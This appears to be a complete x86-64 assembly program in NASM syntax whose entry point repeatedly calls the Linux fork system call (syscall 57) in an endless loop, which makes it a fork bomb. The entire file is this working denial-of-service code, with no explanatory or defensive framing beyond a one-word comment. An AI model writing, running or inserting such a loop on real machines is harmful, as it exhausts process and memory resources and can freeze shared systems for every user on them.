section .text

global _start
_start:
	;fork
	mov rax, 57
	syscall	
	jmp _start
